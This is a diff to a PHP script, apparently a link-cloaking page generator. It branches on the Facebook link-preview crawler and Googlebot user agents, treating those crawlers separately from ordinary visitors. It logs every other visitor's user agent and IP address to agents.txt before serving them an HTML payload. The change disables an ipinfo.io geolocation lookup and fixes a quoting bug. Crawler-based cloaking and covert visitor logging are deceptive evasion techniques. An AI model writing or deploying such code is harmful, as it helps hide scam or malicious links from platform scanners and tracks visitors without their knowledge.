@@ -284,16 +284,16 @@ if ($_POST["url"]) {
 <?php
 $text = "agents.txt";
 
-$ip =  $_SERVER[\'REMOTE_ADDR\'];
-function ip_details($ip)
-{
-    $json       = file_get_contents("http://ipinfo.io/{$ip}");
-    $details    = json_decode($json);
-    return $details;
-}
+// $ip =  $_SERVER[\'REMOTE_ADDR\'];
+// function ip_details($ip)
+// {
+//     $json       = file_get_contents("http://ipinfo.io/{$ip}");
+//     $details    = json_decode($json);
+//     return $details;
+// }
 
-$details = ip_details($ip);
-$country = $details->country;
+// $details = ip_details($ip);
+// $country = $details->country;
 if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
  strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false
@@ -308,7 +308,7 @@ die();
  }
 else {
   $fAgent = fopen($text, \'a\');
-  $agent = $_SERVER[\'HTTP_USER_AGENT\'] . PHP_EOL .\' ok\ . $_SERVER[\'REMOTE_ADDR\']';
+  $agent = $_SERVER[\'HTTP_USER_AGENT\'] . PHP_EOL .\' ok\' . $_SERVER[\'REMOTE_ADDR\'];
     fwrite($fAgent, $agent);
     fclose($fAgent);
     echo "' . $htmlString . '";
